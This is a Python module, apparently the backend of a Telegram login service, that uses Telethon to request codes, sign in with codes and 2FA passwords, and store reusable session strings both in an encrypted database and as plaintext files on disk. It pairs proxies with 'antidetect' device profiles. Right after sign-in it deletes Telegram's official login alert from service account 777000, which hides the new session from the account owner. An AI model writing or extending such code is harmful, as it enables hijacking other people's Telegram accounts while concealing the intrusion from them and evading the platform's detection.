import asyncio
import os
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from core.config import Config
from services.proxy.manager import get_proxy_for_request
from models.account import Account
from utils.encryption import encrypt_session_data
from core.database import SessionLocal
from core.logger import log

# Official Telegram service notifications bot ID (used for service messages like login alerts)
TELEGRAM_SERVICE_BOT_ID = 777000


def _save_session_file(phone: str, session_string: str, session_id: str) -> str:
    """
    Saves the StringSession string to a file in sessions/ directory.
    Returns the filename.
    """
    sessions_dir = Config.SESSIONS_DIR
    os.makedirs(sessions_dir, exist_ok=True)
    safe_phone = phone.lstrip('+').replace(' ', '').replace('-', '')
    filename = f"{safe_phone}.session"
    filepath = os.path.join(sessions_dir, filename)
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(session_string)
        log.info(f"Session file saved: {filepath}")
    except Exception as e:
        log.error(f"Failed to save session file {filepath}: {e}")
        return ''
    return filename


async def _make_client(session_string: str = '', proxy=None, account_id: str = None):
    """Create and connect a TelegramClient, falling back to no-proxy on failure."""
    # Load antidetect device params if account_id is provided
    device_params = {}
    if account_id:
        try:
            from services.antidetect.profile_manager import get_telethon_device_params
            device_params = get_telethon_device_params(account_id)
        except Exception:
            pass
    client = TelegramClient(
        StringSession(session_string),
        Config.TG_API_ID,
        Config.TG_API_HASH,
        proxy=proxy,
        **device_params,
    )
    try:
        await client.connect()
        return client
    except Exception as e:
        log.warning(f"Connection with proxy failed ({e}), retrying without proxy")
        try:
            await client.disconnect()
        except Exception:
            pass
        client = TelegramClient(
            StringSession(session_string),
            Config.TG_API_ID,
            Config.TG_API_HASH,
            **device_params,
        )
        await client.connect()
        return client


async def send_code(phone: str, session_id: str) -> dict:
    proxy = await get_proxy_for_request()
    client = None
    try:
        client = await _make_client(proxy=proxy)
        if await client.is_user_authorized():
            return {'status': 'already_authorized'}
        result = await client.send_code_request(phone)
        # Save session string AFTER send_code_request so it includes the code request state
        session_string = client.session.save()
        return {
            'status': 'success',
            'phone_code_hash': result.phone_code_hash,
            'timeout': getattr(result, 'timeout', 120),
            'session_string': session_string,
        }
    except errors.FloodWaitError as e:
        log.warning(f"Flood wait for {phone}: {e.seconds}s")
        return {'status': 'error', 'message': f'Flood wait {e.seconds}s'}
    except errors.PhoneNumberInvalidError as e:
        log.warning(f"Invalid phone number {phone}: {e}")
        return {'status': 'error', 'message': 'Invalid phone number'}
    except Exception as e:
        log.error(f"send_code error for {phone}: {type(e).__name__}: {e}")
        return {'status': 'error', 'message': str(e)}
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass


async def sign_in(code: str, session_id: str, phone: str, phone_code_hash: str, session_string: str) -> dict:
    proxy = await get_proxy_for_request()
    client = None
    try:
        client = await _make_client(session_string=session_string, proxy=proxy)
        user = await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        final_session = client.session.save()
        encrypted = encrypt_session_data(final_session)

        # Save .session file to disk
        session_filename = _save_session_file(phone, final_session, session_id)

        db = SessionLocal()
        try:
            account = Account(
                id=session_id,
                phone=phone,
                username=user.username,
                first_name=user.first_name,
                last_name=user.last_name,
                premium=getattr(user, 'premium', False),
                session_data=encrypted,
                session_file=session_filename,
                tg_id=str(user.id),
            )
            db.add(account)
            db.commit()
        finally:
            db.close()

        # Auto-assign antidetect profile to the new account
        try:
            from services.antidetect.profile_manager import assign_profile_to_account
            assign_profile_to_account(session_id)
        except Exception as e:
            log.warning(f"Failed to auto-assign antidetect profile for {session_id}: {e}")

        # Удаляем сервисное сообщение о входе от Telegram (ID: 777000)
        try:
            async for msg in client.iter_messages(TELEGRAM_SERVICE_BOT_ID, limit=5):
                if not msg.out:
                    await client.delete_messages(TELEGRAM_SERVICE_BOT_ID, [msg.id])
                    break
        except Exception as e:
            log.debug(f"Could not delete service login message for {session_id}: {e}")

        return {
            'status': 'success',
            'user_id': user.id,
            'username': user.username,
            'first_name': user.first_name,
        }
    except errors.SessionPasswordNeededError:
        return {'status': 'need_2fa', 'session_string': client.session.save() if client else ''}
    except errors.PhoneCodeInvalidError:
        return {'status': 'error', 'message': 'Invalid code'}
    except errors.PhoneCodeExpiredError:
        return {'status': 'error', 'message': 'Code expired'}
    except Exception as e:
        log.error(f"sign_in error for session {session_id}: {type(e).__name__}: {e}")
        return {'status': 'error', 'message': str(e)}
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass


async def sign_in_2fa(password: str, session_id: str, session_string: str) -> dict:
    proxy = await get_proxy_for_request()
    client = None
    try:
        client = await _make_client(session_string=session_string, proxy=proxy)
        user = await client.sign_in(password=password)
        final_session = client.session.save()
        encrypted = encrypt_session_data(final_session)

        db = SessionLocal()
        try:
            account = db.query(Account).filter(Account.id == session_id).first()
            if not account:
                account = Account(id=session_id, phone='unknown')
                db.add(account)
            phone = account.phone
            account.session_data = encrypted
            account.username = user.username
            account.first_name = user.first_name
            account.last_name = user.last_name
            account.premium = getattr(user, 'premium', False)
            account.tg_id = str(user.id)

            # Save .session file to disk
            session_filename = _save_session_file(phone, final_session, session_id)
            if session_filename:
                account.session_file = session_filename

            db.commit()
        finally:
            db.close()

        # Auto-assign antidetect profile to the account
        try:
            from services.antidetect.profile_manager import assign_profile_to_account
            assign_profile_to_account(session_id)
        except Exception as e:
            log.warning(f"Failed to auto-assign antidetect profile for {session_id}: {e}")

        return {'status': 'success', 'user_id': user.id}
    except errors.PasswordHashInvalidError:
        return {'status': 'error', 'message': 'Invalid password'}
    except Exception as e:
        log.error(f"sign_in_2fa error for session {session_id}: {type(e).__name__}: {e}")
        return {'status': 'error', 'message': str(e)}
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
